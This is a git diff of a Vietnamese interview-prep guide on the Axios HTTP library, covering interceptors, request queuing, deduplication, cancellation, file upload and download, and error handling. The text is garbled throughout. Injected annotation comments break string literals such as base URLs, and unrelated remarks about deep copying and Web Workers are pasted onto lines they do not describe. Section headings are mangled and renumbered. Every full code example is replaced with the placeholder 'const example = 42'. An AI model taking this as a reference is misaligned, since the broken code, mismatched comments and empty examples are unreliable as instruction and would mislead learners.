- * - Example: Add interceptor 1 → Add interceptor 2 → Add interceptor 3
- * - Execution: Response received → 1 → 2 → 3
- */
-
- // Chú giải: Request Interceptor 1 (will run SECOND)
-const reqInterceptor1 = apiClient.interceptors.request.use(
-  (config) => {
-    console.log('Request Interceptor 1 - Add default headers');
-    config.headers['X-Custom-Header'] = 'value1';
-    return config;
-  }
-);
-
- // Chú giải: Request Interceptor 2 (will run FIRST - added last)
-const reqInterceptor2 = apiClient.interceptors.request.use(
-  (config) => {
-    console.log('Request Interceptor 2 - Add timestamp');
-    config.headers['X-Timestamp'] = Date.now().toString();
-    return config;
-  }
-);
-
- // Chú giải: Response Interceptor 1 (will run FIRST)
-const resInterceptor1 = apiClient.interceptors.response.use(
-  (response) => {
-    console.log('Response Interceptor 1 - Transform data');
-    return response;
-  }
-);
-
- // Chú giải: Response Interceptor 2 (will run SECOND)
-const resInterceptor2 = apiClient.interceptors.response.use(
-  (response) => {
-    console.log('Response Interceptor 2 - Cache response');
-    return response;
-  }
-);
-
- // Chú giải: ============================================
- // Chú giải: 5. CLEANUP - Remove interceptors when needed
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - Quan trọng: PHẢI remove interceptors khi component unmount
- * - Tránh memory leaks và duplicate interceptors
- * - Use trong useEffect cleanup hoặc componentWillUnmount
- */
-export const cleanupInterceptors = () => {
-  apiClient.interceptors.request.eject(reqInterceptor1);
-  apiClient.interceptors.request.eject(reqInterceptor2);
-  apiClient.interceptors.response.eject(resInterceptor1);
-  apiClient.interceptors.response.eject(resInterceptor2);
-};
-
- // Chú giải: ============================================
- // Chú giải: 6. ADVANCED USE CASE: Request Queuing & Throttling
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - Giới hạn số lượng concurrent requests
- * - Prevent overwhelming server với too many requests cùng lúc
- * - Useful cho rate-limited APIs
- */
-class RequestQueue {
-  private queue: Array<() => Promise<any>> = [];
-  private activeRequests = 0;
-  private maxConcurrent = 5; // Chú giải: Maximum 5 concurrent requests
-
-  async add<T>(requestFn: () => Promise<T>): Promise<T> {
-    // Nếu đã đạt max concurrent, đợi trong queue
-    if (this.activeRequests >= this.maxConcurrent) {
-      await new Promise<void>((resolve) => {
-        this.queue.push(() => {
-          resolve();
-          return Promise.resolve();
-        });
-      });
-    }
-
-    this.activeRequests++;
-
-    try {
-      const result = await requestFn();
-      return result;
-    } finally {
-      this.activeRequests--;
-
- // Chú giải: Process next request in queue
-      const nextRequest = this.queue.shift();
-      if (nextRequest) {
-        nextRequest();
-      }
-    }
-  }
-}
-
-const requestQueue = new RequestQueue();
-
- // Chú giải: Add queuing interceptor
-apiClient.interceptors.request.use(
-  async (config) => {
-    await requestQueue.add(() => Promise.resolve());
-    return config;
-  }
-);
-
- // Chú giải: ============================================
- // Chú giải: 7. ADVANCED: Request Deduplication
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - Ngăn chặn duplicate requests (cùng URL + method + params)
- * - Nếu có request đang pending, return kết quả của request đó
- * - Useful khi user click nhiều lần hoặc component re-render
- */
-const pendingRequests = new Map<string, Promise<any>>();
-
-apiClient.interceptors.request.use(
-  (config) => {
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-    const requestKey = `${config.method}:${config.url}:${JSON.stringify(config.params)}`;
-
-    // Nếu đã có request pending với key này
-    if (pendingRequests.has(requestKey)) {
-      console.log('🔄 Duplicate request detected, using pending request...');
-      // Return pending promise (sẽ reject này để reuse pending request)
-      throw {
-        __DUPLICATE__: true,
-        promise: pendingRequests.get(requestKey),
-      };
-    }
-
- // Chú giải: Store request key in config for later cleanup
-    (config as any).__requestKey = requestKey;
-
-    return config;
-  },
-  (error) => {
-    // Nếu là duplicate request, return pending promise
-    if (error.__DUPLICATE__) {
-      return error.promise;
-    }
-    return Promise.reject(error);
-  }
-);
-
-apiClient.interceptors.response.use(
-  (response) => {
- // Chú giải: Remove from pending requests
-    const requestKey = (response.config as any).__requestKey;
-    if (requestKey) {
-      pendingRequests.delete(requestKey);
-    }
-    return response;
-  },
-  (error) => {
- // Chú giải: Remove from pending requests even on error
-    const requestKey = (error.config as any).__requestKey;
-    if (requestKey) {
-      pendingRequests.delete(requestKey);
-    }
-    return Promise.reject(error);
-  }
-);
-
- // Chú giải: ============================================
- // Chú giải: 8. USAGE EXAMPLES
- // Chú giải: ============================================
-export const exampleUsage = async () => {
-  try {
-    // Tất cả requests sẽ tự động có:
- // Chú giải: - Auth token header
- // Chú giải: - Request ID
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
- // Chú giải: - Error handling
- // Chú giải: - Auto retry on network errors
- // Chú giải: - Token refresh on 401
-    const response = await apiClient.get('/users');
-    console.log('Users:', response.data);
-
-    const user = await apiClient.post('/users', {
-      name: 'John Doe',
-      email: 'john@example.com',
-    });
-    console.log('Created user:', user.data);
-  } catch (error) {
-    console.error('Error:', error);
-  }
-};
-
- // Chú giải: ============================================
- // Chú giải: 9. REACT HOOK INTEGRATION
- // Chú giải: ============================================
-/**
- * Vietnamese Explanation:
- * - Integrate interceptors với React lifecycle
- * - Cleanup khi component unmount
- */
-import { useEffect } from 'react';
-
-export const useAxiosInterceptors = () => {
-  useEffect(() => {
- // Chú giải: Setup interceptors
-    const requestInterceptor = apiClient.interceptors.request.use(
-      (config) => {
- // Chú giải: Add logic here
-        return config;
-      }
-    );
-
-    const responseInterceptor = apiClient.interceptors.response.use(
-      (response) => {
- // Chú giải: Add logic here
-        return response;
-      }
-    );
-
- // Chú giải: Cleanup function
-    return () => {
-      apiClient.interceptors.request.eject(requestInterceptor);
-      apiClient.interceptors.response.eject(responseInterceptor);
-    };
-  }, []); // Chú giải: Empty dependency array = run once on mount
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🎯 Best Practices - Tối Ưu Hóa:**
@@ -6840,54 +2354,9 @@ export const useAxiosInterceptors = () => {
 
 **⚠️ Common Mistakes - Lỗi Thường Gặp:**
 
-```typescript
-// ❌ Sai: Không cleanup interceptors
-useEffect(() => {
-  axios.interceptors.request.use(config => config);
- // Chú giải: Missing cleanup!
-}, []);
-
-// ✅ Đúng: Always cleanup
-useEffect(() => {
-  const interceptor = axios.interceptors.request.use(config => config);
-  return () => axios.interceptors.request.eject(interceptor);
-}, []);
-
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-axios.interceptors.request.use(config => {
-  config.headers.Authorization = 'Bearer token';
- // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-});
-
-// ✅ Đúng: Always return
-axios.interceptors.request.use(config => {
-  config.headers.Authorization = 'Bearer token';
-  return config;
-});
-
- // Chú giải: ❌ Sai: Infinite loop trong token refresh
-axios.interceptors.response.use(
-  res => res,
-  async (error) => {
-    if (error.response?.status === 401) {
-      await axios.post('/auth/refresh'); // Chú giải: Uses same instance → infinite loop!
-      return axios(error.config);
-    }
-  }
-);
-
-// ✅ Đúng: Use separate instance for refresh
-const refreshClient = axios.create();
-axios.interceptors.response.use(
-  res => res,
-  async (error) => {
-    if (error.response?.status === 401 && !error.config._retry) {
-      error.config._retry = true;
-      await refreshClient.post('/auth/refresh');
-      return axios(error.config);
-    }
-  }
-);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **📊 Performance Considerations:**
@@ -6898,13 +2367,14 @@ axios.interceptors.response.use(
 - **Token Refresh**: Queue all requests khi refreshing để avoid multiple refresh calls
 - **Caching**: Cache GET requests trong interceptors để reduce server load
 ---
-## 15. ⏱️ Q15: Advanced Deferring Execution Techniques - Kỹ Thuật Trì Hoãn Thực Thi Nâng Cao  
 
-**P1: Tên câu hỏi:** ⏱️ Q15: Advanced Deferring Execution Techniques - Kỹ Thuật Trì Hoãn Thực Thi Nâng Cao  
+## 29. Q29: ⏱️ Q15: Advanced Deferring Execution Techniques - Kỹ Thuật Trì Hoãn Thực Thi Nâng Cao
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: ⏱️ Q15: Advanced Deferring Execution Techniques - Kỹ Thuật Trì Hoãn Thực Thi Nâng Cao
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 30. Q30: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -6950,421 +2420,41 @@ axios.interceptors.response.use(
 - Web Workers cho **heavy computations** không block main thread
 - Priority scheduling: `scheduler.postTask()` API (Chrome) với priorities (user-blocking, user-visible, background)
 
-
-
-
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: INSTALLATION
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Chú giải: npm install axios
- // Chú giải: yarn add axios
- // Chú giải: pnpm add axios
-
-import axios from 'axios';
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: BASIC REQUESTS
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Chú giải: GET request
-const getUsers = async () => {
-  try {
-    const response = await axios.get('/api/users');
-    console.log(response.data); // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
-    console.log(response.status); // Chú giải: 200
-    console.log(response.headers); // Chú giải: Headers object
-    console.log(response.config); // Chú giải: Request config
-  } catch (error) {
-    console.error(error);
-  }
-};
-
- // Chú giải: POST request
-const createUser = async (userData: any) => {
-  const response = await axios.post('/api/users', userData);
-  // ✅ Auto JSON stringify - không cần JSON.stringify()
-  return response.data;
-};
-
- // Chú giải: PUT/PATCH/DELETE
-const updateUser = (id: string, data: any) => axios.put(`/api/users/${id}`, data);
-const patchUser = (id: string, data: any) => axios.patch(`/api/users/${id}`, data);
-const deleteUser = (id: string) => axios.delete(`/api/users/${id}`);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **1.2. Axios vs Fetch API - So Sánh Chi Tiết**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
-// FETCH API - Nhiều bước thủ công
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
-const fetchUsers = async () => {
-  try {
-    const response = await fetch('/api/users');
-    
- // Chú giải: ❌ Phải check response.ok manually
-    if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
-    }
-    
- // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
-    const data = await response.json();
-    return data;
-  } catch (error) {
-    console.error(error);
-  }
-};
-
- // Chú giải: POST với fetch - verbose
-const createUserFetch = async (userData: any) => {
-  const response = await fetch('/api/users', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json', // Chú giải: ❌ Manual header
-    },
-    body: JSON.stringify(userData), // Chú giải: ❌ Manual stringify
-  });
-  
-  if (!response.ok) throw new Error('Failed');
-  return await response.json(); // Chú giải: ❌ Manual parse
-};
-
- // Chú giải: ═══════════════════════════════════════════════════════════
-// AXIOS - Tự động & ngắn gọn
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Chú giải: ✅ Axios: Clean & automatic
-const axiosUsers = async () => {
-  const { data } = await axios.get('/api/users');
- // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
-  // ✅ Auto throw error nếu status >= 400
-  return data;
-};
-
- // Chú giải: POST với axios - simple
-const createUserAxios = async (userData: any) => {
-  const { data } = await axios.post('/api/users', userData);
- // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
- // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
-  return data;
-};
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: COMPARISON TABLE
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-/**
- * ┌────────────────────┬──────────────────┬──────────────────┐
- * │ Feature            │ Fetch            │ Axios            │
- * ├────────────────────┼──────────────────┼──────────────────┤
- * │ JSON Transform     │ ❌ Manual        │ ✅ Automatic     │
- * │ Error Handling     │ ❌ Manual check  │ ✅ Auto throw    │
- * │ Timeout            │ ❌ AbortControl  │ ✅ Built-in      │
- * │ Interceptors       │ ❌ None          │ ✅ Built-in      │
- * │ Progress Events    │ ❌ Complex       │ ✅ Easy          │
- * │ Cancel Requests    │ ⚠️ AbortControl  │ ✅ Multiple ways │
- * │ Browser Support    │ ✅ Native        │ ⚠️ +13KB bundle  │
- * │ CSRF Protection    │ ❌ Manual        │ ✅ Built-in      │
- * │ Base URL           │ ❌ Manual        │ ✅ Config        │
- * │ Request/Response   │ ❌ None          │ ✅ Transform     │
- * └────────────────────┴──────────────────┴──────────────────┘
- */
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
-
-
 
 ### **2. Axios Instance & Configuration**
 
 #### **2.1. Create Custom Instance**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: CREATE AXIOS INSTANCE - Best Practice
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-import axios, { AxiosInstance } from 'axios';
-
- // Chú giải: Tạo instance với base config
-const apiClient: AxiosInstance = axios.create({
-  baseURL: process.env.REACT_APP_API_URL || 'https: // Chú giải: api.example.com',
-  timeout: 10000, // Chú giải: 10 seconds
-  headers: {
-    'Content-Type': 'application/json',
-    'Accept': 'application/json',
-  },
-  
- // Chú giải: Credentials & CSRF
-  withCredentials: true, // Chú giải: Send cookies với cross-origin requests
-  xsrfCookieName: 'XSRF-TOKEN', // Chú giải: CSRF token cookie name
-  xsrfHeaderName: 'X-XSRF-TOKEN', // Chú giải: CSRF token header name
-  
- // Chú giải: Validate status
-  validateStatus: (status) => status >= 200 && status < 500,
-});
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: MULTIPLE INSTANCES - Cho different APIs
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Chú giải: Main API
-const mainAPI = axios.create({
-  baseURL: 'https: // Chú giải: api.main.com',
-  timeout: 5000,
-});
-
-// Auth API (separate instance để tránh infinite loop trong token refresh)
-const authAPI = axios.create({
-  baseURL: 'https: // Chú giải: auth.main.com',
-  timeout: 3000,
-});
-
- // Chú giải: Analytics API
-const analyticsAPI = axios.create({
-  baseURL: 'https: // Chú giải: analytics.main.com',
-  timeout: 15000,
-});
-
- // Chú giải: File Upload API
-const uploadAPI = axios.create({
-  baseURL: 'https: // Chú giải: upload.main.com',
-  timeout: 60000, // Chú giải: 1 minute for large files
-  headers: {
-    'Content-Type': 'multipart/form-data',
-  },
-});
-
- // Chú giải: Sử dụng
-mainAPI.get('/users');
-authAPI.post('/login', credentials);
-analyticsAPI.post('/track', event);
-uploadAPI.post('/files', formData);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **2.2. Full Request Configuration**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: COMPLETE CONFIG OPTIONS
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const config = {
- // Chú giải: URL
-  url: '/users',
-  baseURL: 'https: // Chú giải: api.example.com',
-  
- // Chú giải: Method
-  method: 'get', // Chú giải: 'get' | 'post' | 'put' | 'delete' | 'patch' | 'head' | 'options'
-  
- // Chú giải: Headers
-  headers: {
-    'Authorization': 'Bearer token',
-    'X-Custom-Header': 'value',
-  },
-  
- // Chú giải: Query params (?key=value)
-  params: {
-    page: 1,
-    limit: 10,
-    sort: 'createdAt:desc',
-  },
-  
- // Chú giải: Params serializer
-  paramsSerializer: {
-    serialize: (params) => {
- // Chú giải: Custom serialization
-      return Object.entries(params)
-        .map(([key, val]) => `${key}=${encodeURIComponent(val)}`)
-        .join('&');
-    },
-  },
-  
- // Chú giải: Request body
-  data: {
-    name: 'John',
-    age: 30,
-  },
-  
- // Chú giải: Timeout
-  timeout: 5000, // Chú giải: 5 seconds
-  
- // Chú giải: Response type
-  responseType: 'json', // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
-  
- // Chú giải: Response encoding
-  responseEncoding: 'utf8',
-  
- // Chú giải: Max content length
-  maxContentLength: 2000,
-  maxBodyLength: 2000,
-  
- // Chú giải: Validate status
-  validateStatus: (status) => status >= 200 && status < 300,
-  
- // Chú giải: Max redirects
-  maxRedirects: 5,
-  
- // Chú giải: HTTP Auth
-  auth: {
-    username: 'user',
-    password: 'pass',
-  },
-  
- // Chú giải: Proxy
-  proxy: {
-    protocol: 'http',
-    host: '127.0.0.1',
-    port: 9000,
-    auth: {
-      username: 'proxy-user',
-      password: 'proxy-pass',
-    },
-  },
-  
- // Chú giải: Progress events
-  onUploadProgress: (progressEvent) => {
-    const percentCompleted = Math.round(
-      (progressEvent.loaded * 100) / progressEvent.total!
-    );
-    console.log(`Upload: ${percentCompleted}%`);
-  },
-  
-  onDownloadProgress: (progressEvent) => {
-    const percentCompleted = Math.round(
-      (progressEvent.loaded * 100) / progressEvent.total!
-    );
-    console.log(`Download: ${percentCompleted}%`);
-  },
-  
- // Chú giải: Decompress response
-  decompress: true,
-};
-
-const response = await axios(config);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 ### **3. Request Cancellation - Hủy Request**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: ABORT CONTROLLER (Modern - Axios 0.22+)
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const controller = new AbortController();
-
-axios.get('/api/users', {
-  signal: controller.signal
-}).then(response => {
-  console.log(response.data);
-}).catch(error => {
-  if (axios.isCancel(error)) {
-    console.log('Request canceled:', error.message);
-  }
-});
-
- // Chú giải: Cancel request
-controller.abort('User canceled the request');
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: USE CASE 1: Cancel on Component Unmount (React)
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-import { useEffect, useState } from 'react';
-
-function UserList() {
-  const [users, setUsers] = useState([]);
-  
-  useEffect(() => {
-    const controller = new AbortController();
-    
-    const fetchUsers = async () => {
-      try {
-        const { data } = await axios.get('/api/users', {
-          signal: controller.signal
-        });
-        setUsers(data);
-      } catch (error) {
-        if (!axios.isCancel(error)) {
-          console.error('Error fetching users:', error);
-        }
-      }
-    };
-    
-    fetchUsers();
-    
- // Chú giải: Cleanup: Cancel request khi unmount
-    return () => {
-      controller.abort();
-    };
-  }, []);
-  
-  return <div>...</div>;
-}
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: USE CASE 2: Cancel Previous Search Request
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function SearchComponent() {
-  const [query, setQuery] = useState('');
-  const controllerRef = useRef<AbortController | null>(null);
-  
-  const handleSearch = async (searchQuery: string) => {
-    // Cancel previous request nếu có
-    if (controllerRef.current) {
-      controllerRef.current.abort();
-    }
-    
- // Chú giải: Create new controller
-    controllerRef.current = new AbortController();
-    
-    try {
-      const { data } = await axios.get('/api/search', {
-        params: { q: searchQuery },
-        signal: controllerRef.current.signal
-      });
-      setResults(data);
-    } catch (error) {
-      if (!axios.isCancel(error)) {
-        console.error('Search error:', error);
-      }
-    }
-  };
-  
- // Chú giải: Debounce search
-  useEffect(() => {
-    const timer = setTimeout(() => {
-      if (query) {
-        handleSearch(query);
-      }
-    }, 500);
-    
-    return () => clearTimeout(timer);
-  }, [query]);
-}
-
- // Chú giải: ═══════════════════════════════════════════════════════════
-// CANCEL TOKEN (Legacy - Deprecated nhưng vẫn hoạt động)
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const CancelToken = axios.CancelToken;
-const source = CancelToken.source();
-
-axios.get('/api/users', {
-  cancelToken: source.token
-}).catch(error => {
-  if (axios.isCancel(error)) {
-    console.log('Request canceled:', error.message);
-  }
-});
-
- // Chú giải: Cancel
-source.cancel('Operation canceled by user');
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -7373,295 +2463,25 @@ source.cancel('Operation canceled by user');
 
 #### **4.1. File Upload with Progress**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: UPLOAD SINGLE FILE
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const uploadFile = async (file: File) => {
-  const formData = new FormData();
-  formData.append('file', file);
-  formData.append('userId', '123');
-  
-  try {
-    const { data } = await axios.post('/api/upload', formData, {
-      headers: {
-        'Content-Type': 'multipart/form-data',
-      },
-      onUploadProgress: (progressEvent) => {
-        const percentCompleted = Math.round(
-          (progressEvent.loaded * 100) / progressEvent.total!
-        );
-        console.log(`Upload progress: ${percentCompleted}%`);
- // Chú giải: Update UI progress bar
-      },
-    });
-    
-    return data;
-  } catch (error) {
-    console.error('Upload failed:', error);
-    throw error;
-  }
-};
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: UPLOAD MULTIPLE FILES
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const uploadMultipleFiles = async (files: File[]) => {
-  const formData = new FormData();
-  
-  files.forEach((file, index) => {
-    formData.append(`file${index}`, file);
-  });
-  
-  const { data } = await axios.post('/api/upload-multiple', formData, {
-    headers: {
-      'Content-Type': 'multipart/form-data',
-    },
-    onUploadProgress: (progressEvent) => {
-      const percentCompleted = Math.round(
-        (progressEvent.loaded * 100) / progressEvent.total!
-      );
-      console.log(`Total upload progress: ${percentCompleted}%`);
-    },
-  });
-  
-  return data;
-};
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: REACT COMPONENT - File Upload với Progress Bar
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function FileUploader() {
-  const [uploadProgress, setUploadProgress] = useState(0);
-  const [uploading, setUploading] = useState(false);
-  
-  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
-    const file = event.target.files?.[0];
-    if (!file) return;
-    
-    const formData = new FormData();
-    formData.append('file', file);
-    
-    setUploading(true);
-    
-    try {
-      await axios.post('/api/upload', formData, {
-        onUploadProgress: (progressEvent) => {
-          const progress = Math.round(
-            (progressEvent.loaded * 100) / progressEvent.total!
-          );
-          setUploadProgress(progress);
-        },
-      });
-      
-      alert('Upload successful!');
-    } catch (error) {
-      console.error('Upload failed:', error);
-    } finally {
-      setUploading(false);
-      setUploadProgress(0);
-    }
-  };
-  
-  return (
-    <div>
-      <input type="file" onChange={handleFileUpload} disabled={uploading} />
-      {uploading && (
-        <div className="progress-bar">
-          <div style={{ width: `${uploadProgress}%` }}>
-            {uploadProgress}%
-          </div>
-        </div>
-      )}
-    </div>
-  );
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **4.2. File Download**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: DOWNLOAD FILE
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const downloadFile = async (fileId: string) => {
-  try {
-    const response = await axios.get(`/api/files/${fileId}`, {
-      responseType: 'blob', // Chú giải: ✅ Important cho files
-      onDownloadProgress: (progressEvent) => {
-        const percentCompleted = Math.round(
-          (progressEvent.loaded * 100) / progressEvent.total!
-        );
-        console.log(`Download progress: ${percentCompleted}%`);
-      },
-    });
-    
-    // Create blob URL và trigger download
-    const url = window.URL.createObjectURL(new Blob([response.data]));
-    const link = document.createElement('a');
-    link.href = url;
-    link.setAttribute('download', 'filename.pdf'); // Chú giải: Filename
-    document.body.appendChild(link);
-    link.click();
-    link.remove();
-    window.URL.revokeObjectURL(url);
-  } catch (error) {
-    console.error('Download failed:', error);
-  }
-};
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: DOWNLOAD DIFFERENT FILE TYPES
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const downloadPDF = async () => {
-  const response = await axios.get('/api/report.pdf', {
-    responseType: 'blob',
-  });
-  
-  const blob = new Blob([response.data], { type: 'application/pdf' });
-  const url = window.URL.createObjectURL(blob);
-  window.open(url); // Chú giải: Open in new tab
-};
-
-const downloadExcel = async () => {
-  const response = await axios.get('/api/export.xlsx', {
-    responseType: 'arraybuffer', // Chú giải: For Excel files
-  });
-  
-  const blob = new Blob([response.data], {
-    type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
-  });
-  
-  const url = window.URL.createObjectURL(blob);
-  const link = document.createElement('a');
-  link.href = url;
-  link.download = 'export.xlsx';
-  link.click();
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 ### **5. Error Handling - Xử Lý Lỗi Chi Tiết**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: ERROR STRUCTURE
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-try {
-  const response = await axios.get('/api/users');
-} catch (error) {
-  if (axios.isAxiosError(error)) {
- // Chú giải: ✅ Type-safe error handling
-    
-    if (error.response) {
-      // ❌ Server responded với status code ngoài 2xx
-      console.error('Response error:');
-      console.error('Status:', error.response.status);
-      console.error('Data:', error.response.data);
-      console.error('Headers:', error.response.headers);
-      
- // Chú giải: Handle specific status codes
-      switch (error.response.status) {
-        case 400:
-          console.error('Bad Request - Invalid data');
-          break;
-        case 401:
-          console.error('Unauthorized - Please login');
- // Chú giải: Redirect to login
-          window.location.href = '/login';
-          break;
-        case 403:
-          console.error('Forbidden - No permission');
-          break;
-        case 404:
-          console.error('Not Found');
-          break;
-        case 422:
-          console.error('Validation Error');
- // Chú giải: Show validation errors
-          const validationErrors = error.response.data.errors;
-          break;
-        case 429:
-          console.error('Too Many Requests - Rate limited');
-          break;
-        case 500:
-          console.error('Server Error');
-          break;
-        case 503:
-          console.error('Service Unavailable');
-          break;
-      }
-      
-    } else if (error.request) {
-      // ❌ Request sent nhưng không nhận được response
-      console.error('Request error - No response received');
-      console.error('Possible causes:');
-      console.error('- Network error');
-      console.error('- CORS issue');
-      console.error('- Request timeout');
-      console.error('- Server not responding');
-      
-    } else {
- // Chú giải: ❌ Lỗi khi setup request
-      console.error('Setup error:', error.message);
-    }
-    
-    console.error('Config:', error.config);
-  } else {
-    // Lỗi khác (không phải Axios error)
-    console.error('Unexpected error:', error);
-  }
-}
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: CUSTOM ERROR HANDLER
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-interface ApiErrorResponse {
-  success: boolean;
-  message: string;
-  status: number | null;
-  data: any;
-  errors?: Record<string, string[]>; // Chú giải: Validation errors
-}
-
-const handleAxiosError = (error: unknown): ApiErrorResponse => {
-  if (axios.isAxiosError(error)) {
-    const message = error.response?.data?.message || error.message;
-    const status = error.response?.status || null;
-    const errors = error.response?.data?.errors;
-    
-    return {
-      success: false,
-      message,
-      status,
-      data: error.response?.data,
-      errors,
-    };
-  }
-  
-  return {
-    success: false,
-    message: 'An unexpected error occurred',
-    status: null,
-    data: null,
-  };
-};
-
- // Chú giải: Usage
-try {
-  const response = await axios.post('/api/users', userData);
-  return { success: true, data: response.data, message: 'Success', status: 200 };
-} catch (error) {
-  return handleAxiosError(error);
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -7670,149 +2490,44 @@ try {
 
 #### **6.1. Retry Logic**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: AUTO RETRY với Exponential Backoff
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const axiosRetry = async (config: any, retries = 3, delay = 1000) => {
-  for (let i = 0; i < retries; i++) {
-    try {
-      return await axios(config);
-    } catch (error) {
-      if (i === retries - 1) throw error;
-      
- // Chú giải: Exponential backoff
-      const waitTime = delay * Math.pow(2, i);
-      console.log(`Retry ${i + 1}/${retries} after ${waitTime}ms...`);
-      await new Promise(resolve => setTimeout(resolve, waitTime));
-    }
-  }
-};
-
- // Chú giải: Usage
-const data = await axiosRetry({
-  method: 'get',
-  url: '/api/users',
-}, 3, 1000);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **6.2. Request Deduplication**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: PREVENT DUPLICATE REQUESTS
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const pendingRequests = new Map<string, Promise<any>>();
-
-const dedupeRequest = async (config: any) => {
-  const key = `${config.method}:${config.url}:${JSON.stringify(config.params)}`;
-  
-  // Nếu có request pending
-  if (pendingRequests.has(key)) {
-    console.log('🔄 Reusing pending request...');
-    return pendingRequests.get(key);
-  }
-  
- // Chú giải: Create new request
-  const promise = axios(config).finally(() => {
-    pendingRequests.delete(key);
-  });
-  
-  pendingRequests.set(key, promise);
-  return promise;
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **6.3. Response Caching**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: SIMPLE CACHE IMPLEMENTATION
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-interface CacheEntry {
-  data: any;
-  timestamp: number;
-}
-
-const cache = new Map<string, CacheEntry>();
-
-const cachedRequest = async (
-  url: string,
-  config = {},
-  ttl = 5 * 60 * 1000 // Chú giải: 5 minutes
-) => {
-  const cacheKey = `${url}:${JSON.stringify(config)}`;
-  
